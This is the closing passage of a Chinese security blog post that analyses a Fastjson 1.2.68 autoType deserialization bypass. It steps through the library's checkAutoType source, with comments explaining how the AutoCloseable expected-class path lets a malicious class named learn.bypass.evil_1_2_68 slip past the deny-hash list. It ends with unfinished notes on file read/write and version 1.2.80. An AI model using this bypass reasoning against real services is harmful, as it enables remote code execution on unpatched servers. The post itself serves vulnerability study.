</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span> <span class="o">==</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span> <span class="o">||</span> <span class="n">expectClass</span> <span class="o">==</span> <span class="n">Serializable</span><span class="o">.</span><span class="na">class</span> <span class="o">...)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">expectClassFlag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">expectClassFlag</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span> <span class="c1">//java.lang.AutoCloseable类不是上述类的对象,因此expectClassFlag设置为true
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="n">typeName</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;$&#39;</span><span class="o">,</span> <span class="sc">&#39;.&#39;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">long</span> <span class="n">fullHash</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">fnv1a_64</span><span class="o">(</span><span class="n">className</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">internalWhite</span> <span class="o">=</span> <span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">INTERNAL_WHITELIST_HASHCODES</span><span class="o">,</span>  <span class="n">fullHash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">internalDenyHashCodes</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">long</span> <span class="n">hash</span> <span class="o">=</span> <span class="n">h3</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">^=</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">*=</span> <span class="n">PRIME</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">internalDenyHashCodes</span><span class="o">,</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">((!</span><span class="n">internalWhite</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">autoTypeSupport</span> <span class="o">||</span> <span class="n">expectClassFlag</span><span class="o">))</span> <span class="o">{</span> <span class="c1">//由于expectClassFlag被设置为true,因此进入黑名单检验环节,显然learn.bypass.evil_1_2_68不属于黑名单,因此通过检验
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kt">long</span> <span class="n">hash</span> <span class="o">=</span> <span class="n">h3</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">^=</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">*=</span> <span class="n">PRIME</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">acceptHashCodes</span><span class="o">,</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">denyHashCodes</span><span class="o">,</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">getClassFromMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">acceptHashCodes</span><span class="o">,</span> <span class="n">fullHash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">getClassFromMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">deserializers</span><span class="o">.</span><span class="na">findClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">typeMapping</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">internalWhite</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">clazz</span> <span class="o">!=</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">HashMap</span><span class="o">.</span><span class="na">class</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">expectClass</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;type not match. &#34;</span> <span class="o">+</span> <span class="n">typeName</span> <span class="o">+</span> <span class="s">&#34; -&gt; &#34;</span> <span class="o">+</span> <span class="n">expectClass</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(!</span><span class="n">autoTypeSupport</span><span class="o">)</span> <span class="o">{</span><span class="c1">//autoTypeSupport为false,因此继续进行检测
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">jsonType</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">InputStream</span> <span class="n">is</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">resource</span> <span class="o">=</span> <span class="n">typeName</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;.&#39;</span><span class="o">,</span> <span class="sc">&#39;/&#39;</span><span class="o">)</span> <span class="o">+</span> <span class="s">&#34;.class&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">defaultClassLoader</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">is</span> <span class="o">=</span> <span class="n">defaultClassLoader</span><span class="o">.</span><span class="na">getResourceAsStream</span><span class="o">(</span><span class="n">resource</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">is</span> <span class="o">=</span> <span class="n">ParserConfig</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">().</span><span class="na">getResourceAsStream</span><span class="o">(</span><span class="n">resource</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">is</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">ClassReader</span> <span class="n">classReader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ClassReader</span><span class="o">(</span><span class="n">is</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">TypeCollector</span> <span class="n">visitor</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TypeCollector</span><span class="o">(</span><span class="s">&#34;&lt;clinit&gt;&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
</span></span><span class="line"><span class="cl">                <span class="n">classReader</span><span class="o">.</span><span class="na">accept</span><span class="o">(</span><span class="n">visitor</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">jsonType</span> <span class="o">=</span> <span class="n">visitor</span><span class="o">.</span><span class="na">hasJsonType</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// skip
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">IOUtils</span><span class="o">.</span><span class="na">close</span><span class="o">(</span><span class="n">is</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">int</span> <span class="n">mask</span> <span class="o">=</span> <span class="n">Feature</span><span class="o">.</span><span class="na">SupportAutoType</span><span class="o">.</span><span class="na">mask</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">autoTypeSupport</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">autoTypeSupport</span>
</span></span><span class="line"><span class="cl">                <span class="o">||</span> <span class="o">(</span><span class="n">features</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="o">)</span> <span class="o">!=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">                <span class="o">||</span> <span class="o">(</span><span class="n">JSON</span><span class="o">.</span><span class="na">DEFAULT_PARSER_FEATURE</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="o">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">autoTypeSupport</span> <span class="o">||</span> <span class="n">jsonType</span> <span class="o">||</span> <span class="n">expectClassFlag</span><span class="o">)</span> <span class="o">{</span><span class="c1">//expectClassFlag为true,因此进行loadClass操作
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kt">boolean</span> <span class="n">cacheClass</span> <span class="o">=</span> <span class="n">autoTypeSupport</span> <span class="o">||</span> <span class="n">jsonType</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="n">cacheClass</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">jsonType</span><span class="o">)</span> <span class="o">{</span> <span class="c1">//jsonType为false,因此没有直接添加到缓存map中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">TypeUtils</span><span class="o">.</span><span class="na">addMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">clazz</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">)</span> <span class="c1">// classloader is danger
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="o">||</span> <span class="n">javax</span><span class="o">.</span><span class="na">sql</span><span class="o">.</span><span class="na">DataSource</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">)</span> <span class="c1">// dataSource can load jdbc driver
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="o">||</span> <span class="n">javax</span><span class="o">.</span><span class="na">sql</span><span class="o">.</span><span class="na">RowSet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">)</span> <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="o">)</span> <span class="o">{</span> <span class="c1">//检测是否为ClassLoader,DataSource,RowSet等类的子类,如果是则抛出异常
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">                    判断目标类是否是expectClass类的子类,是的话就添加到缓存map中并返回该目标类,否则直接抛出异常
</span></span></span><span class="line"><span class="cl"><span class="cm">                    因此恶意类必须要继承自AutoCloseable,才能够通过该判断继续进行利用
</span></span></span><span class="line"><span class="cl"><span class="cm">                    */</span>
</span></span><span class="line"><span class="cl">                    <span class="n">TypeUtils</span><span class="o">.</span><span class="na">addMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">clazz</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;type not match. &#34;</span> <span class="o">+</span> <span class="n">typeName</span> <span class="o">+</span> <span class="s">&#34; -&gt; &#34;</span> <span class="o">+</span> <span class="n">expectClass</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/b4136aa6f920ccc59419edf63c6c1345.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/b4136aa6f920ccc59419edf63c6c1345.png, https://img.mi3aka.eu.org/2023/02/b4136aa6f920ccc59419edf63c6c1345.png 1.5x, https://img.mi3aka.eu.org/2023/02/b4136aa6f920ccc59419edf63c6c1345.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/b4136aa6f920ccc59419edf63c6c1345.png"
        title="https://img.mi3aka.eu.org/2023/02/b4136aa6f920ccc59419edf63c6c1345.png" /></p>
<blockquote>
<p>todo</p>
</blockquote>
<p>1.2.68读写文件</p>
<h2 id="1280">1.2.80</h2>
<p>对groovy的利用理解有点问题,过几天再写</p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2022-11-10</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/ysoserial/" class="prev" rel="prev" title="ysoserial反序列化链分析"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>ysoserial反序列化链分析</a>
            <a href="/log4j2/" class="next" rel="next" title="log4j2分析">log4j2分析<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="giscus" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://giscus.app">Giscus</a>.
            </noscript></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mi3aka</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{"giscus":{"category":"Announcements","categoryId":"DIC_kwDOG4BtJM4CTls2","darkTheme":"dark","emitMetadata":"0","inputPosition":"bottom","lang":"zh-CN","lazyLoading":false,"lightTheme":"light","mapping":"og:title","reactionsEnabled":"1","repo":"mi3aka/mi3aka.github.io","repoId":"R_kgDOG4BtJA"}},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
